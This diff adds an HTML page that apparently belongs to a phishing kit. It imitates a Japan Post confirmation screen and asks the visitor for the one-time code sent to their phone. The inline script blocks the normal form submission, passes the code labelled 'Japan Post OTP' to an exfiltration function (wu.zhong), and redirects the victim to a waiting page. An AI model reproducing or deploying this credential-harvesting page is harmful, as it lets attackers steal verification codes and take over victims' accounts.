@@ -1,0 +1,52 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res/css/jp.css">
+    <title>jp</title>
+</head>
+<body>
+
+  <header>
+        <img src="res/img/logo.png">
+  </header>
+    
+ <main>   
+        <div class="login">
+        <div class="box">
+            <h3>Confirmation</h3>
+            <p>Please enter the code sent to your phone number to continue.</p>
+          
+<form action="post.php" method="post">
+        <div class="group">
+        <input type="text" name="otp" required placeholder="Enter the code">
+
+        </div>
+
+        <div><button type="sumbit">Continue</button></div>
+    </form>
+    
+        </div>
+    </div>
+
+ </main>
+
+
+ <script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+    wu.zhong(`🔒 Japan Post OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+
+</body>
+</html>
